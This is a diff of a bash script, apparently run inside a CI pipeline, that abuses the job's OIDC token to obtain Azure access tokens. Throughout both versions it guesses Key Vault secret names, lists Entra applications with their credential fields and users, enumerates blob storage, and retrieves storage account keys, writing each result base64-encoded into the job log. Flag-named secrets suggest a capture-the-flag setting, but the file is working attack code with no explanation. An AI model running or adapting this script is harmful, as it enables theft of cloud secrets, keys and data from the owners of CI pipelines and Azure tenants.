@@ -1,85 +1,89 @@
-#!/usr/bin/env bash
-set +e
-T="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
-C="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
+#!/bin/bash
+set -e
 
-echo "=== OIDC ==="
+echo "=== OIDC Token ==="
 OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
   "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
 echo "OIDC_LEN=${#OIDC}"
 
-echo "=== Vault token (OIDC SP) ==="
-VAULT_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
-  -d "client_id=$C&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC&grant_type=client_credentials&scope=https://vault.azure.net/.default")
-VTOK=$(echo "$VAULT_RESP" | jq -r .access_token)
-echo "VTOK_LEN=${#VTOK}"
-
-echo "=== KV2: kv-tbl-sec-x3euoz ==="
-KV2="https://kv-tbl-sec-x3euoz.vault.azure.net"
-KV2_LIST=$(curl -sS "$KV2/secrets?api-version=7.4" -H "Authorization: Bearer $VTOK")
-echo "KV2_LIST_B64=$(echo "$KV2_LIST" | base64 -w0)"
-
-echo "=== KV2 individual secrets ==="
-for NAME in flag ctf-flag the-flag tbl-flag secret data-export-key admin-password master-key storage-key backup-key reporting-key connection-string config-secret; do
-  RESP=$(curl -sS "$KV2/secrets/$NAME?api-version=7.4" -H "Authorization: Bearer $VTOK")
-  VAL=$(echo "$RESP" | jq -r '.value // empty' 2>/dev/null)
-  ERR=$(echo "$RESP" | jq -r '.error.message // empty' 2>/dev/null)
-  if [ -n "$VAL" ]; then
-    echo "KV2_${NAME}_B64=$(echo "$VAL" | base64 -w0)"
-  else
-    echo "KV2_${NAME}_ERR=$(echo "$ERR" | head -c 100)"
-  fi
-done
-
-echo "=== Graph: list apps ==="
-GRAPH_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
-  -d "client_id=$C&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC&grant_type=client_credentials&scope=https://graph.microsoft.com/.default")
-GT=$(echo "$GRAPH_RESP" | jq -r .access_token)
-echo "GT_LEN=${#GT}"
-
-if [ "${#GT}" -gt 100 ]; then
-  APPS=$(curl -sS "https://graph.microsoft.com/v1.0/applications?\$select=displayName,appId,keyCredentials,passwordCredentials" -H "Authorization: Bearer $GT")
-  echo "GRAPH_APPS_B64=$(echo "$APPS" | base64 -w0)"
-  
-  SPS=$(curl -sS "https://graph.microsoft.com/v1.0/servicePrincipals?\$select=displayName,appId" -H "Authorization: Bearer $GT")
-  echo "GRAPH_SPS_B64=$(echo "$SPS" | base64 -w0)"
-  
-  USERS=$(curl -sS "https://graph.microsoft.com/v1.0/users?\$select=displayName,userPrincipalName,mail" -H "Authorization: Bearer $GT")
-  echo "GRAPH_USERS_B64=$(echo "$USERS" | base64 -w0)"
+echo "=== Azure AD Exchange ==="
+AAD=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
+  -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
+  -d "scope=https://storage.azure.com/.default" \
+  -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
+  -d "assertion=$OIDC" \
+  -d "requested_token_use=on_behalf_of" \
+  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+  -d "client_assertion=$OIDC")
+ST=$(echo "$AAD" | jq -r .access_token)
+if [ "$ST" = "null" ] || [ -z "$ST" ]; then
+  echo "OBO failed, trying client_credentials with federated..."
+  AAD=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
+    -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
+    -d "scope=https://storage.azure.com/.default" \
+    -d "grant_type=client_credentials" \
+    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+    -d "client_assertion=$OIDC")
+  ST=$(echo "$AAD" | jq -r .access_token)
+fi
+echo "STORAGE_TOKEN_LEN=${#ST}"
+if [ "$ST" = "null" ] || [ -z "$ST" ]; then
+  echo "STORAGE_TOKEN_ERROR=$(echo "$AAD" | jq -c .)"
+  # Try management scope instead
+  echo "=== Trying management scope ==="
+  AAD2=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
+    -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
+    -d "scope=https://management.azure.com/.default" \
+    -d "grant_type=client_credentials" \
+    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+    -d "client_assertion=$OIDC")
+  MT=$(echo "$AAD2" | jq -r .access_token)
+  echo "MGMT_TOKEN_LEN=${#MT}"
 fi
 
-echo "=== Storage token ==="
-STOR_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
-  -d "client_id=$C&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC&grant_type=client_credentials&scope=https://storage.azure.com/.default")
-ST=$(echo "$STOR_RESP" | jq -r .access_token)
-echo "ST_LEN=${#ST}"
+# If we got storage token, list blobs
+if [ "$ST" != "null" ] && [ -n "$ST" ]; then
+  echo "=== List Blobs: sttblbackupprodx3euoz/exports ==="
+  B1=$(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2020-10-02" \
+    "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list")
+  echo "EXPORTS_B64=$(echo "$B1" | base64 -w0)"
+  
+  echo "=== List Blobs: sttblappcfgprodx3euoz/config ==="
+  B2=$(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2020-10-02" \
+    "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list")
+  echo "CONFIG_B64=$(echo "$B2" | base64 -w0)"
+  
+  echo "=== List Blobs: sttblcilogsprodx3euoz/logs ==="
+  B3=$(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2020-10-02" \
+    "https://sttblcilogsprodx3euoz.blob.core.windows.net/logs?restype=container&comp=list")
+  echo "LOGS_B64=$(echo "$B3" | base64 -w0)"
+  
+  echo "=== List Blobs: sttblarchiveprodx3euoz ==="
+  B4=$(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2020-10-02" \
+    "https://sttblarchiveprodx3euoz.blob.core.windows.net/?comp=list&include=metadata")
+  echo "ARCHIVE_B64=$(echo "$B4" | base64 -w0)"
+fi
 
-if [ "${#ST}" -gt 100 ]; then
-  for SA in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz sttblarchiveprodx3euoz sttblsecretsprodx3euoz sttblreportprodx3euoz sttblflagprodx3euoz; do
-    CONT=$(curl -sS "https://$SA.blob.core.windows.net/?comp=list" \
-      -H "Authorization: Bearer $ST" -H "x-ms-version: 2020-10-02" 2>&1)
-    STATUS=$(echo "$CONT" | head -c 3)
-    if echo "$CONT" | grep -qi "container\|blob\|flag"; then
-      echo "SA_${SA}_B64=$(echo "$CONT" | base64 -w0)"
-    else
-      echo "SA_${SA}=$(echo "$CONT" | head -c 150)"
-    fi
+# Also try management token for resources if storage failed
+if [ -n "$MT" ] && [ "$MT" != "null" ]; then
+  echo "=== Full Resource List ==="
+  RES=$(curl -sS -H "Authorization: Bearer $MT" \
+    "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resources?api-version=2021-04-01")
+  echo "RESOURCES_B64=$(echo "$RES" | base64 -w0)"
+  
+  # List storage account keys
+  for SA in sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblcilogsprodx3euoz sttblarchiveprodx3euoz; do
+    echo "=== Storage Keys: $SA ==="
+    KEYS=$(curl -sS -X POST -H "Authorization: Bearer $MT" -H "Content-Length: 0" \
+      "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-05-01")
+    echo "KEYS_${SA}_B64=$(echo "$KEYS" | base64 -w0)"
   done
-fi
-
-echo "=== Management: list ALL resources ==="
-MGMT_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
-  -d "client_id=$C&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC&grant_type=client_credentials&scope=https://management.azure.com/.default")
-MT=$(echo "$MGMT_RESP" | jq -r .access_token)
-echo "MT_LEN=${#MT}"
-
-SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
-if [ "${#MT}" -gt 100 ]; then
-  RESOURCES=$(curl -sS "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" -H "Authorization: Bearer $MT")
-  echo "RESOURCES_B64=$(echo "$RESOURCES" | base64 -w0)"
   
-  RGS=$(curl -sS "https://management.azure.com/subscriptions/$SUB/resourcegroups?api-version=2021-04-01" -H "Authorization: Bearer $MT")
-  echo "RGS_B64=$(echo "$RGS" | base64 -w0)"
+  # Also try listing blobs via management token with storage scope
+  echo "=== Try storage data with mgmt token ==="
+  B1M=$(curl -sS -H "Authorization: Bearer $MT" -H "x-ms-version: 2020-10-02" \
+    "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list" 2>&1)
+  echo "EXPORTS_MGMT=$(echo "$B1M" | head -5 | base64 -w0)"
 fi
 
 echo "=== DONE ==="
